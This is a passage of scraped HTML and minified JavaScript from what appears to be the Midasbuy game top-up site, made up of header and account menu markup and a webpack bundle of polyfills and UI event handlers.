<script type="text/javascript">!function(){"use strict";var r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";window.btoa||(window.btoa=function(t){for(var o,e,n=String(t),a=0,i=r,c="";n.charAt(0|a)||(i="=",a%1);c+=i.charAt(63&o>>8-a%1*8)){if((e=n.charCodeAt(a+=.75))>255)throw new Error("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");o=o<<8|e}return c}),window.atob||(window.atob=function(t){var o=String(t).replace(/[=]+$/,"");if(o.length%4==1)throw new Error("'atob' failed: The string to be decoded is not correctly encoded.");for(var e,n,a=0,i=0,c="";n=o.charAt(i++);~n&&(e=a%4?64*e+n:n,a++%4)?c+=String.fromCharCode(255&e>>(-2*a&6)):0)n=r.indexOf(n);return c})}();</script>
<script type="text/javascript" src="https://www.midasbuy.com/oversea_web/static/js/x-midas/foXpt24MxhVpLTWmFsULBWJ0hD79nV7v9xWmNlTyU3Bqe4AEdEhMwu9wQOZRznaiasaltyxZa4hdYZdpZTVP_4fNAGKEXIYBcBqHZ0gpIMU~.js"></script>
</head>
<body>
<input type="hidden" id="xMidasToken" value="aaed521615412329ef2422a07c9c76a3fb2275df89f5fe08526b17f9ed5b64f831c0361d64e4f86860fe1d8a661eac08">
<input type="hidden" id="xMidasVersion" value="1.0.0">
<div class="wrap game-ticket game-wrap game_list have-pay-sec">
	<div class="header-box g-clr"></div>
	<div class="header">
		<div class="main g-clr">
			<div class="menu-more">
				<div class="icon-box">
					<div class="line1 line"></div>
					<div class="line2 line"></div>
					<div class="line3 line"></div>
				</div>
			</div>
			<h1 class="logo"><a class="pc" style="cursor:default" href="javascript:void(0)">midasbuy</a></h1>
			<div class="menu">
				<a class="active navIndexButton" href="javascript:void(0)" cr="homepage">Home</a>
				<a target="_blank" href="https://cdn.midasbuy.com/oversea_web/faq/faq.html">Help Center</a>
			</div>
			<div class="log">
				<div class="logined">
					<img class="user-pic" src="https://midas.gtimg.cn/oversea_web/image/nav/nuser-icon.png" alt="avator"/>
				</div>
				<div class="luanch">
					<div class="country" cr="regional_select" id="country_select">
						<img class="country-icon" cr="regional_select" src="https://midas.gtimg.cn/oversea_web/static/images/flag/world.2556fe97306bdec1268d8b8a935b56c5.jpg" alt="flag"/>
					</div>
				</div>
			</div>
			<div class="user-mess-box">
				<div class="san"></div>
				<div class="head-box">
					<img class="top-logo" src="https://www.midasbuy.com/oversea_web/static/images/pc-logo.png" alt="img">
					<img class="close-btn" src="https://www.midasbuy.com/oversea_web/static/images/big-new-close-icon.png" alt="img">
				</div>
				<ul>
					<!-- 未登录 -->
					<li class="user-not-login">
						<p class="label"></p>
						<div class="btn-box">
							<div class="log-in headerLoginButton">SIGN IN</div>
							<div class="register headerLoginButton">CREATE ACCOUNT</div>
						</div>
					</li>
					<li class="link">
						<a class="headerLoginButton" href="javascript:void(0)"><p class="unlogin-account-settings">View Account</p></a>
					</li>
					<li class="link">
						<a class="headerLoginButton" href="javascript:void(0)"><p class="unlogin-transaction-record">Transcation Record</p></a>
					</li>
				</ul>
			</div>
			<div class="menu-nav-box">
				<div class="head-box">
					<img class="close-btn" src="https://www.midasbuy.com/oversea_web/static/images/big-new-close-icon.png" alt="img">
					<img class="top-logo" src="https://www.midasbuy.com/oversea_web/static/images/pc-logo.png" alt="img">
				</div>
				<ul>
					<li class="acitve navIndexButton">
						<a href="javascript:void(0)" cr="homepage">Home</a>
					</li>
					<li class="">
						<a href="https://cdn.midasbuy.com/oversea_web/faq/faq.html" cr="homepage">Help Center</a>
					</li>
				</ul>
			</div>
			<div class="bg"></div>
		</div>
		<div class="menu-nav-box-bg"></div>
	</div>
	<script type="text/javascript">
    !function(e){var r={};function o(t){if(r[t])return r[t].exports;var n=r[t]={i:t,l:!1,exports:{}};return e[t].call(n.exports,n,n.exports,o),n.l=!0,n.exports}o.m=e,o.c=r,o.d=function(t,n,e){o.o(t,n)||Object.defineProperty(t,n,{enumerable:!0,get:e})},o.r=function(t){'undefined'!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:'Module'}),Object.defineProperty(t,'__esModule',{value:!0})},o.t=function(n,t){if(1&t&&(n=o(n)),8&t)return n;if(4&t&&'object'==typeof n&&n&&n.__esModule)return n;var e=Object.create(null);if(o.r(e),Object.defineProperty(e,'default',{enumerable:!0,value:n}),2&t&&'string'!=typeof n)for(var r in n)o.d(e,r,function(t){return n[t]}.bind(null,r));return e},o.n=function(t){var n=t&&t.__esModule?function(){return t.default}:function(){return t};return o.d(n,'a',n),n},o.o=function(t,n){return Object.prototype.hasOwnProperty.call(t,n)},o.p="/oversea_web/static/",o(o.s="+YL4")}({"+3V6":function(t,n,e){var r=e("X6VK");r(r.S,'Array',{isArray:e("Xfku")})},"+YL4":function(t,n,e){"use strict";e.r(n);e("x0AK"),e("kXJn"),e("yMpN");var r=e("9f4c"),o=e.n(r),i=e("BUht"),u=e.n(i),c=e("Y6fs"),a=e.n(c),s=e("JKhl"),f=e("I2RX"),l=e("QMnT"),p=window.report,d=window.user,h=window.redPointConfigs;u()('#headerUsercenterButton').on('click',function(){p.click('account'),y('accountSettings'),a.a.usercenter()}),u()('#headerTransactionButton').on('click',function(){p.click('transaction_record'),y('transactionRecord'),a.a.transcation()}),u()('#headerLogoutButton').on('click',function(){var t=window.goServerUrl;return u.a.ajax({url:t+'/logout',type:'POST',data:JSON.stringify({endpoint_type:'browser'}),contentType:'application/json; charset=utf-8',dataType:'json',success:function(){location.reload()}})}),u()('.headerLoginButton').on('click',function(){var t=u()(this);t.hasClass('log-in')?p.click('login'):t.hasClass('register')?p.click('register_for_login'):t.children(":first").hasClass('unlogin-account-settings')?p.click('account_for_login'):t.children(":first").hasClass('unlogin-transaction-record')&&p.click('transaction_record_for_login'),a.a.login({redirect:location.href})}),u()('.header .menu-more').on('click',function(){u()(this).removeClass('activeEnd'),u()('.header .menu-nav-box').hasClass('active')?(u()(this).addClass('activeEnd'),setTimeout(function(){u()('.header .menu-nav-box').removeClass('active')},300),u()('.header .menu-nav-box').addClass('show'),u()('.menu-nav-box-bg').show(),u()(this).removeClass('active')):(u()('.header .menu-nav-box').addClass('active show'),u()('.menu-nav-box-bg').show(),u()(this).addClass('active'))}),u()('.menu-nav-box-bg').on('click',function(){u()(this).hide(),u()('.header .menu-nav-box,.header .menu-more').removeClass('show active'),u()('.menu-nav-box-bg').hide()}),u()('.header .menu-nav-box .head-box .close-btn').on('click',function(){u()('.header .menu-nav-box,.header .menu-more').removeClass('show active'),u()('.menu-nav-box-bg').hide()}),u()('.header .user-mess-box .head-box .close-btn').on('click',function(){u()('.header .user-mess-box').removeClass('mobile-show'),u()('.bg').hide(),u()('.header .log .logined').removeClass('act')}),u()('.header .logined').click(function(){u()('.bg').show(),768<u()(window).width()?u()(this).hasClass('act')?(u()(this).removeClass('act'),u()('.bg').hide(),u()('.header .user-mess-box').slideUp(200)):(u()(this).addClass('act'),u()('.header .user-mess-box').slideDown(200)):u()(this).hasClass('act')?(u()(this).removeClass('act'),u()('.bg').hide(),u()('.header .user-mess-box').removeClass('mobile-show')):(u()(this).addClass('act'),u()('.header .user-mess-box').addClass('mobile-show'))}),u()('.bg').on('click',function(){768<u()(window).width()?(u()(this).css('display','none'),u()('.header .logined').removeClass('act'),u()('.header .user-mess-box').slideUp(400)):(u()('.header .logined').removeClass('act'),u()('.header .user-mess-box').removeClass('mobile-show'),u()('.bg').css('display','none'))}),u()('.header .menu-nav-box li.mul-li .mul-li-title').on('click',function(){u()(this).parent().find('.multistage-nav-box').slideToggle(100),u()(this).parent().hasClass('up')?u()(this).parent().removeClass('up'):u()(this).parent().addClass('up')});var v=!0;function g(){u()(document.body).width()<=710?u()('[limit]').attr('limit','9'):u()('[limit]').attr('limit','12'),u()('[limit]').limit()}function y(t){if(d){var n=d.uid,e=Object(f.a)('RED_POINT')||{};e[n+t]=Date.now(),Object(l.a)('RED_POINT',e)}}function b(t,n){var e=function(t){switch(t){case'accountSettings':return u()('#headerUsercenterButton .login-account-settings');case'transactionRecord':return u()('#headerTransactionButton .login-transaction-record');case'unlogin-accountSettings':return u()('a.headerLoginButton .unlogin-account-settings');case'unlogin-transactionRecord':return u()('a.headerLoginButton .unlogin-transaction-record');case'showRedPoint2Unlogin':return u()('a.headerLoginButton p');default:return null}}(t);e&&(n?e.addClass('message'):e.removeClass('message'))}u()('.header .menu .multistage-nav').hover(function(){v=!0,u()('.multistage-nav-box').show()},function(){setTimeout(function(){v||u()('.multistage-nav-box').hide()},1500),v=!1}),u()('.header .user-mess-box').click(function(t){t.stopPropagation()}),u()('body').click(function(){u()('.header .logined').removeClass('act')}),u()('body').click(function(t){var n=u()(t.target||t.srcElement),e=n.attr('cr');e=e||n.parent().attr('cr');for(var r=20;0<r&&n[0]!==u()('body')[0]&&!e;)r--,n=n.parent(),e=e||n.attr('cr');if(e){var o=e.split('.'),i=void 0;1<o.length?(i=o.pop(),e=o.join('.'),p.click(e,{value:i})):p.click(e)}}),u()('#country_select').click(function(){var t=o()();a.a.regionselect(t)}),u()('.navIndexButton').click(function(){var t=o()();a.a.home(t)}),u.a.fn.limit=function(){u()('[limit]').each(function(){var t=u()(this).text(),n=u()(this).text().length,e=u()(this).attr('limit');e<n&&(u()(this).attr('title',t),t=u()(this).text(t.substring(0,e)+'...'))})},u()(function(){g(),1===u()('.banner-wrap .swiper-container .swiper-slide').length?(new window.Swiper('.banner-wrap .swiper-container',{loop:!0}),u()('.banner-wrap .swiper-container .swiper-slide').css('max-width','100%'),u()('.banner-wrap .swiper-button-prev.swiper-button-white,.banner-wrap .swiper-button-next.swiper-button-white').hide(),u()('.swiper-container-horizontal>.swiper-pagination-bullets').hide(),u()('.banner-wrap .swiper-container').addClass('leng-one'),u()('.banner-wrap .swiper-container').addClass('swiper-no-swiping')):new window.Swiper('.banner-wrap .swiper-container',{autoplay:2500,slidesPerView:'auto',centeredSlides:!0,paginationClickable:!0,spaceBetween:24,effect:'left',loop:!0,pagination:'.swiper-pagination',nextButton:'.swiper-button-next',prevButton:'.swiper-button-prev'}),u()('.banner-link').click(function(t){t.preventDefault(),a.a.linkto(u()(this).attr('href'))}),u()('.go-redeem-btn, .gift-exchange-btn').click(function(){var t=u()(this).find('.imp');if(t&&t.length){var n=Object(f.a)('clickedRedeemRedPointArray')||[],e=t[0].getAttribute('data-id');n.indexOf(e)<0&&(n.push(e),Object(l.a)('clickedRedeemRedPointArray',n))}a.a.redeem(o()())}),u()('.go-currency-btn, .game-recharge-btn').click(function(){a.a.currency(o()())}),u()('.go-shop-btn, .prop-store-btn').click(function(){a.a.shop(o()())}),u()('.go-sub-btn, .subscription-btn, .go-subscribe-btn').click(function(){a.a.sub(o()())}),u()('#cookieBtn').click(function(){u()('.record-detailt-pop.cookie-agreement-pop').addClass('show'),u()('.record-detailt-pop').css('webkitTransform','translateX(0)')}),u()('#cookieCloseBtn').click(function(){u()('.record-detailt-pop').css('webkitTransform','translateX(600%)'),u()('.record-detailt-pop.cookie-agreement-pop').removeClass('show')})}),u()(function(){var t;(t=u()('.go-redeem-btn .imp'))&&t.length&&-1<(Object(f.a)('readedRedeemRedPointArray')||[]).indexOf(t[0].getAttribute('data-id'))&&t.each(function(){u()(this).removeClass('imp')});var n=u()(window).height();Object(s.a)()&&u()(window).resize(function(){var t=u()(this).height();140<n-t?u()('.login .content, .forget .content').css({'min-height':'calc(100vh + 200px)'}):u()('.login .content, .forget .content').css({'min-height':'calc(100vh - 57px)'})}),u()(window).resize(function(){g(),u()('[limit]').limit();var t=u()(document).scrollTop(),n=u()(window).height(),e=u()(document).height(),r=u()('.have-pay-sec .footer').outerHeight(),o=u()('.footer').outerHeight(),i=u()('.header-box').outerHeight();n===e?(u()('.pay-sec').addClass('pay-sec-flex'),u()('.pay-sec').show(),u()('.pay-sec').css('bottom',r+'px'),u()('.have-pay-sec .footer').show(),1<=u()('.special-foot').length&&(n-(u()('.special-box').offset()?u()('.special-box').offset().top:0)-u()('.special-box').outerHeight()>o+16?u()('.special-foot .footer').show():u()('.wrap').removeClass('special-foot'))):(u()('.record-detailt-pop .detailt-box').css('max-height',n-i-74+'px'),u()('.wrap').removeClass('special-foot'),Math.ceil(t+n)>=e?(u()('.pay-sec').addClass('pay-sec-flex'),u()('.pay-sec').show(),u()('.pay-sec').css('bottom',r+'px'),u()('.have-pay-sec .footer').show()):(u()('.pay-sec').removeClass('pay-sec-flex'),u()('.have-pay-sec .footer').hide(),u()('.pay-sec').css('bottom',"0px")));u()(window).width(),u()('.record-detailt-pop').width();u()('.record-detailt-pop').hasClass('show')&&u()('.record-detailt-pop').css('webkitTransform','translateX(0)')}),u()(document).scroll(function(){0<u()(window).scrollTop()?u()('.login .header, .forget .header').css('background','#141B3D'):u()('.login .header, .forget .header').css('background','none')})}),u()(function(){(d?function(){var t=Object.keys(h);if(t.length){var c=Object(f.a)('RED_POINT')||{};t.forEach(function(t){var n=h[t];if('object'==typeof n&&null!==n){var e=d.uid,r=c[e+t],o=n.show,i=n.version,u=new Date(i).getTime();b(t,r&&u&&r<u||o&&!r)}})}}:function(){if(h){var t=h.showRedPoint2Unlogin,n=Object.keys(h),r=!1;if(n.forEach(function(t){var n=h[t];if('object'==typeof n&&null!==n){var e=n.show2Unlogin;'boolean'==typeof e&&(r=!0,b("unlogin-"+t,e))}}),!r){if(!t)return;b('showRedPoint2Unlogin',!!t)}}})()})},"/6rt":function(t,n,e){"use strict";var r=e("E7Vc");t.exports=function(t,n){return!!t&&r(function(){n?t.call(null,function(){},1):t.call(null)})}},"049C":function(t,n,e){"use strict";var r=e("X6VK"),o=e("CLuC"),s=e("n+VH"),f=e("BUlT"),l=e("Sp5b"),p=[].slice;r(r.P+r.F*e("E7Vc")(function(){o&&p.call(o)}),'Array',{slice:function(t,n){var e=l(this.length),r=s(this);if(n=void 0===n?e:n,'Array'==r)return p.call(this,t,n);for(var o=f(t,e),i=f(n,e),u=l(i-o),c=new Array(u),a=0;a<u;a++)c[a]='String'==r?this.charAt(o+a):this[o+a];return c}})},"0oPD":function(t,n){n.f=Object.getOwnPropertySymbols},"1Alt":function(t,n){var e=0,r=Math.random();t.exports=function(t){return'Symbol('.concat(void 0===t?'':t,')_',(++e+r).toString(36))}},"1Tj+":function(t,n,e){var r=e("IdFN"),o=e("WWmS"),i=e("ml72"),u=e("5MU4"),c=e("ezc+"),a=e("HWsP"),s=Object.getOwnPropertyDescriptor;n.f=e("GGqZ")?s:function(t,n){if(t=i(t),n=u(n,!0),a)try{return s(t,n)}catch(t){}if(c(t,n))return o(!r.f.call(t,n),t[n])}},"1qKx":function(t,n,e){var r=e("X6VK");r(r.S,'Object',{setPrototypeOf:e("3ydu").set})},"1wfo":function(t,n,e){var m=e("9liC"),x=e("Cmsx"),w=e("UnHL"),S=e("Sp5b"),r=e("C5nI");t.exports=function(l,t){var p=1==l,d=2==l,h=3==l,v=4==l,g=6==l,y=5==l||g,b=t||r;return function(t,n,e){for(var r,o,i=w(t),u=x(i),c=m(n,e,3),a=S(u.length),s=0,f=p?b(t,a):d?b(t,0):void 0;s<a;s++)if((y||s in u)&&(o=c(r=u[s],s,i),l))if(p)f[s]=o;else if(o)switch(l){case 3:return!0;case 5:return r;case 6:return s;case 2:f.push(r)}else if(v)return!1;return g?-1:h||v?v:f}}},"2LOZ":function(t,n,e){var r=e("Ibj2"),o=e("9dxi")('iterator'),i=Array.prototype;t.exports=function(t){return void 0!==t&&(r.Array===t||i[o]===t)}},"2UZ+":function(t,n,e){"use strict";var r=e("X6VK"),o=e("1wfo")(6),i='findIndex',u=!0;i in[]&&Array(1)[i](function(){u=!1}),r(r.P+r.F*u,'Array',{findIndex:function(t,n){return o(this,t,1<arguments.length?n:void 0)}}),e("OfmW")(i)},"3RxL":function(t,n,e){e("gRlk")('getOwnPropertyNames',function(){return e("UYXy").f})},"3y5y":function(t,n,e){"use strict";var r=e("X6VK"),o=e("9Bb+");r(r.P+r.F*!e("/6rt")([].reduce,!0),'Array',{reduce:function(t,n){return o(this,t,arguments.length,n,!1)}})},"3ydu":function(t,n,o){function i(t,n){if(r(t),!e(n)&&null!==n)throw TypeError(n+": can't set as prototype!")}var e=o("Bsg+"),r=o("PAFS");t.exports={set:Object.setPrototypeOf||('__proto__'in{}?function(t,e,r){try{(r=o("9liC")(Function.call,o("1Tj+").f(Object.prototype,'__proto__').set,2))(t,[]),e=!(t instanceof Array)}catch(t){e=!0}return function(t,n){return i(t,n),e?t.__proto__=n:r(t,n),t}}({},!1):void 0),check:i}},"4enF":function(t,n,e){"use strict";e("LEAW")('sup',function(t){return function(){return t(this,'sup','','')}})},"5Fu2":function(t,n,e){var o=e("PAFS"),i=e("b8Rm"),u=e("9dxi")('species');t.exports=function(t,n){var e,r=o(t).constructor;return void 0===r||null==(e=o(r)[u])?n:i(e)}},"5MU4":function(t,n,e){var o=e("Bsg+");t.exports=function(t,n){if(!o(t))return t;var e,r;if(n&&'function'==typeof(e=t.toString)&&!o(r=e.call(t)))return r;if('function'==typeof(e=t.valueOf)&&!o(r=e.call(t)))return r;if(!n&&'function'==typeof(e=t.toString)&&!o(r=e.call(t)))return r;throw TypeError("Can't convert object to primitive value")}},"5hJT":function(t,n,e){var r=e("X6VK");r(r.S+r.F,'Object',{assign:e("NR3o")})},"6/FK":function(t,n,e){var r=e("X6VK");r(r.S+r.F*!e("GGqZ"),'Object',{defineProperties:e("pU1/")})},"63Ad":function(t,n){t.exports=function(t){return t&&t.__esModule?t:{default:t}}},"6Vmy":function(t,n,e){"use strict";var r=e("X6VK"),o=e("CIiV");r(r.S+r.F*e("E7Vc")(function(){function t(){}return!(Array.of.call(t)instanceof t)}),'Array',{of:function(){for(var t=0,n=arguments.length,e=new('function'==typeof this?this:Array)(n);t<n;)o(e,t,arguments[t++]);return e.length=n,e}})},"6d4m":function(t,n,e){"use strict";var r=e("X6VK"),o=e("Alw5"),i='includes';r(r.P+r.F*e("Fl7L")(i),'String',{includes:function(t,n){return!!~o(this,t,i).indexOf(t,1<arguments.length?n:void 0)}})},"6mBe":function(t,n,e){"use strict";Object.defineProperty(n,"__esModule",{value:!0}),n.default=function(t,n){var e=Object.prototype.toString.call(n).slice(8,-1);return null!=n&&e===t}},"75LO":function(t,n,e){var r=e("UnHL"),o=e("LuBU");e("gRlk")('keys',function(){return function(t){return o(r(t))}})},"7lGJ":function(t,n,e){"use strict";var r=e("X6VK"),o=e("1wfo")(0),i=e("/6rt")([].forEach,!0);r(r.P+r.F*!i,'Array',{forEach:function(t,n){return o(this,t,n)}})},"8kJd":function(t,n,e){var r=e("ZVIm")('keys'),o=e("1Alt");t.exports=function(t){return r[t]||(r[t]=o(t))}},"9Bb+":function(t,n,e){var f=e("b8Rm"),l=e("UnHL"),p=e("Cmsx"),d=e("Sp5b");t.exports=function(t,n,e,r,o){f(n);var i=l(t),u=p(i),c=d(i.length),a=o?c-1:0,s=o?-1:1;if(e<2)for(;;){if(a in u){r=u[a],a+=s;break}if(a+=s,o?a<0:c<=a)throw TypeError('Reduce of empty array with no initial value')}for(;o?0<=a:a<c;a+=s)a in u&&(r=n(r,u[a],a,i));return r}},"9dxi":function(t,n,e){var r=e("ZVIm")('wks'),o=e("1Alt"),i=e("P56o").Symbol,u='function'==typeof i;(t.exports=function(t){return r[t]||(r[t]=u&&i[t]||(u?i:o)('Symbol.'+t))}).store=r},"9f4c":function(t,n,e){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var o={};n.default=function(t,n,i){void 0===t&&(t=location.href),void 0===n&&(n='&'),void 0===i&&(i='=');var e=t.replace(/.+?\?/,'').replace(/#.*/,''),r=e.split(n);return o[e]||(o[e]=r.reduce(function(n,t){var e=t.indexOf(i);if(-1<e){var r=t.substr(0,e);if(r){var o=t.substr(e+1);try{n[r]=decodeURIComponent(o)}catch(t){n[r]=o}}}return n},{})),o[e]}},"9liC":function(t,n,e){var i=e("b8Rm");t.exports=function(r,o,t){if(i(r),void 0===o)return r;switch(t){case 1:return function(t){return r.call(o,t)};case 2:return function(t,n){return r.call(o,t,n)};case 3:return function(t,n,e){return r.call(o,t,n,e)}}return function(){return r.apply(o,arguments)}}},"9ovy":function(t,n,e){"use strict";var l=e("PAFS"),p=e("Sp5b"),d=e("dVhv"),h=e("Fu0I");e("Wifh")('match',1,function(r,o,s,f){return[function(t){var n=r(this),e=null==t?void 0:t[o];return void 0!==e?e.call(t,n):new RegExp(t)[o](String(n))},function(t){var n=f(s,t,this);if(n.done)return n.value;var e=l(t),r=String(this);if(!e.global)return h(e,r);for(var o,i=e.unicode,u=[],c=e.lastIndex=0;null!==(o=h(e,r));){var a=String(o[0]);''===(u[c]=a)&&(e.lastIndex=d(r,p(e.lastIndex),i)),c++}return 0===c?null:u}]})},"9p7t":function(t,n,e){"use strict";var r=e("X6VK"),o=e("1wfo")(2);r(r.P+r.F*!e("/6rt")([].filter,!0),'Array',{filter:function(t,n){return o(this,t,n)}})},A1KM:function(t,n,e){var r=e("ezc+"),o=e("UnHL"),i=e("8kJd")('IE_PROTO'),u=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=o(t),r(t,i)?t[i]:'function'==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?u:null}},ABKx:function(t,n,e){"use strict";function r(t){var n=D[t]=F(T[W]);return n._k=t,n}function o(t,n){P(t);for(var e,r=S(n=A(n)),o=0,i=r.length;o<i;)nt(t,e=r[o++],n[e]);return t}function i(t){var n=G.call(this,t=E(t,!0));return!(this===q&&f(D,t)&&!f(Z,t))&&(!(n||!f(this,t)||!f(D,t)||f(this,z)&&this[z][t])||n)}function u(t,n){if(t=A(t),n=E(n,!0),t!==q||!f(D,n)||f(Z,n)){var e=K(t,n);return!e||!f(D,n)||f(t,z)&&t[z][n]||(e.enumerable=!0),e}}function c(t){for(var n,e=B(A(t)),r=[],o=0;e.length>o;)f(D,n=e[o++])||n==z||n==h||r.push(n);return r}function a(t){for(var n,e=t===q,r=B(e?Z:A(t)),o=[],i=0;r.length>i;)!f(D,n=r[i++])||e&&!f(q,n)||o.push(D[n]);return o}var s=e("P56o"),f=e("ezc+"),l=e("GGqZ"),p=e("X6VK"),d=e("sU/p"),h=e("zIP/").KEY,v=e("E7Vc"),g=e("ZVIm"),y=e("jPEw"),b=e("1Alt"),m=e("9dxi"),x=e("fxUj"),w=e("z6KD"),S=e("ltS6"),O=e("Xfku"),P=e("PAFS"),j=e("Bsg+"),C=e("UnHL"),A=e("ml72"),E=e("5MU4"),k=e("WWmS"),F=e("Vx+c"),V=e("UYXy"),U=e("1Tj+"),_=e("0oPD"),R=e("U1KF"),I=e("LuBU"),K=U.f,L=R.f,B=V.f,T=s.Symbol,M=s.JSON,X=M&&M.stringify,W='prototype',z=m('_hidden'),N=m('toPrimitive'),G={}.propertyIsEnumerable,H=g('symbol-registry'),D=g('symbols'),Z=g('op-symbols'),q=Object[W],J='function'==typeof T&&!!_.f,Q=s.QObject,Y=!Q||!Q[W]||!Q[W].findChild,$=l&&v(function(){return 7!=F(L({},'a',{get:function(){return L(this,'a',{value:7}).a}})).a})?function(t,n,e){var r=K(q,n);r&&delete q[n],L(t,n,e),r&&t!==q&&L(q,n,r)}:L,tt=J&&'symbol'==typeof T.iterator?function(t){return'symbol'==typeof t}:function(t){return t instanceof T},nt=function(t,n,e){return t===q&&nt(Z,n,e),P(t),n=E(n,!0),P(e),f(D,n)?(e.enumerable?(f(t,z)&&t[z][n]&&(t[z][n]=!1),e=F(e,{enumerable:k(0,!1)})):(f(t,z)||L(t,z,k(1,{})),t[z][n]=!0),$(t,n,e)):L(t,n,e)};J||(d((T=function(t){if(this instanceof T)throw TypeError('Symbol is not a constructor!');var n=b(0<arguments.length?t:void 0),e=function(t){this===q&&e.call(Z,t),f(this,z)&&f(this[z],n)&&(this[z][n]=!1),$(this,n,k(1,t))};return l&&Y&&$(q,n,{configurable:!0,set:e}),r(n)})[W],'toString',function(){return this._k}),U.f=u,R.f=nt,e("zIds").f=V.f=c,e("IdFN").f=i,_.f=a,l&&!e("wEu9")&&d(q,'propertyIsEnumerable',i,!0),x.f=function(t){return r(m(t))}),p(p.G+p.W+p.F*!J,{Symbol:T});for(var et='hasInstance,isConcatSpreadable,iterator,match,replace,search,species,split,toPrimitive,toStringTag,unscopables'.split(','),rt=0;et.length>rt;)m(et[rt++]);for(var ot=I(m.store),it=0;ot.length>it;)w(ot[it++]);p(p.S+p.F*!J,'Symbol',{for:function(t){return f(H,t+='')?H[t]:H[t]=T(t)},keyFor:function(t){if(!tt(t))throw TypeError(t+' is not a symbol!');for(var n in H)if(H[n]===t)return n},useSetter:function(){Y=!0},useSimple:function(){Y=!1}}),p(p.S+p.F*!J,'Object',{create:function(t,n){return void 0===n?F(t):o(F(t),n)},defineProperty:nt,defineProperties:o,getOwnPropertyDescriptor:u,getOwnPropertyNames:c,getOwnPropertySymbols:a});var ut=v(function(){_.f(1)});p(p.S+p.F*ut,'Object',{getOwnPropertySymbols:function(t){return _.f(C(t))}}),M&&p(p.S+p.F*(!J||v(function(){var t=T();return'[null]'!=X([t])||'{}'!=X({a:t})||'{}'!=X(Object(t))})),'JSON',{stringify:function(t){for(var n,e,r=[t],o=1;o<arguments.length;)r.push(arguments[o++]);if(e=n=r[1],(j(n)||void 0!==t)&&!tt(t))return O(n)||(n=function(t,n){if('function'==typeof e&&(n=e.call(this,t,n)),!tt(n))return n}),r[1]=n,X.apply(M,r)}}),T[W][N]||e("tjmq")(T[W],N,T[W].valueOf),y(T,'Symbol'),y(Math,'Math',!0),y(s.JSON,'JSON',!0)},Alw5:function(t,n,e){var r=e("NVL/"),o=e("GCOZ");t.exports=function(t,n,e){if(r(n))throw TypeError('String#'+e+" doesn't accept regex!");return String(o(t))}},BDzi:function(t,n,e){"use strict";var r=e("X6VK"),c=e("Sp5b"),a=e("Alw5"),s='endsWith',f=''[s];r(r.P+r.F*e("Fl7L")(s),'String',{endsWith:function(t,n){var e=a(this,t,s),r=1<arguments.length?n:void 0,o=c(e.length),i=void 0===r?o:Math.min(c(r),o),u=String(t);return f?f.call(e,u,i):e.slice(i-u.length,i)===u}})},BTfu:function(t,n,e){"use strict";e("LEAW")('fixed',function(t){return function(){return t(this,'tt','','')}})},BUht:function(t,n,e){"use strict";e("d3/y"),Object.defineProperty(n,"__esModule",{value:!0}),n.default=void 0;var r=window.jQuery;n.default=r},BUlT:function(t,n,e){var r=e("mvii"),o=Math.max,i=Math.min;t.exports=function(t,n){return(t=r(t))<0?o(t+n,0):i(t,n)}},"Bsg+":function(t,n){t.exports=function(t){return'object'==typeof t?null!==t:'function'==typeof t}},C5nI:function(t,n,e){var r=e("Qno1");t.exports=function(t,n){return new(r(t))(n)}},CIiV:function(t,n,e){"use strict";var r=e("U1KF"),o=e("WWmS");t.exports=function(t,n,e){n in t?r.f(t,n,o(0,e)):t[n]=e}},CLuC:function(t,n,e){var r=e("P56o").document;t.exports=r&&r.documentElement},Cmsx:function(t,n,e){var r=e("n+VH");t.exports=Object('z').propertyIsEnumerable(0)?Object:function(t){return'String'==r(t)?t.split(''):Object(t)}},E2HC:function(t,n,e){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=e("6mBe");n.default=function(t){return r.default('Object',t)&&null!==t}},E7Vc:function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},E8p1:function(t,n,e){"use strict";var r=e("P56o"),o=e("U1KF"),i=e("GGqZ"),u=e("9dxi")('species');t.exports=function(t){var n=r[t];i&&n&&!n[u]&&o.f(n,u,{configurable:!0,get:function(){return this}})}},FEHE:function(t,n,e){"use strict";var r=e("X6VK"),i=e("Sp5b"),u=e("Alw5"),c='startsWith',a=''[c];r(r.P+r.F*e("Fl7L")(c),'String',{startsWith:function(t,n){var e=u(this,t,c),r=i(Math.min(1<arguments.length?n:void 0,e.length)),o=String(t);return a?a.call(e,o,r):e.slice(r,r+o.length)===o}})},Fl7L:function(t,n,e){var r=e("9dxi")('match');t.exports=function(n){var e=/./;try{'/./'[n](e)}catch(t){try{return e[r]=!1,!'/./'[n](e)}catch(t){}}return!0}},Fu0I:function(t,n,e){"use strict";var o=e("OFVL"),i=RegExp.prototype.exec;t.exports=function(t,n){var e=t.exec;if('function'==typeof e){var r=e.call(t,n);if('object'!=typeof r)throw new TypeError('RegExp exec method returned something other than an Object or null');return r}if('RegExp'!==o(t))throw new TypeError('RegExp#exec called on incompatible receiver');return i.call(t,n)}},GCOZ:function(t,n){t.exports=function(t){if(null==t)throw TypeError("Can't call method on  "+t);return t}},GGqZ:function(t,n,e){t.exports=!e("E7Vc")(function(){return 7!=Object.defineProperty({},'a',{get:function(){return 7}}).a})},HWsP:function(t,n,e){t.exports=!e("GGqZ")&&!e("E7Vc")(function(){return 7!=Object.defineProperty(e("mggL")('div'),'a',{get:function(){return 7}}).a})},HZro:function(t,n,e){var r=e("Bsg+"),o=e("zIP/").onFreeze;e("gRlk")('seal',function(n){return function(t){return n&&r(t)?n(o(t)):t}})},HkTM:function(t,n,e){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var u=e("oGmy");n.default=function(t,n){var e,r=0;if(u.default(t)){var o=t.length;for(e=t[0];r<o&&!1!==n.call(e,e,r,t);e=t[++r]);}else for(var i in t)if(!1===n.call(t[i],t[i],i,t))break;return t}},I2RX:function(t,n,e){"use strict";n.a=function(t){var n=window.localStorage&&window.localStorage.getItem(t),e=null;if(n)try{e=JSON.parse(n)}catch(t){}return e}},IKQL:function(t,n,e){var 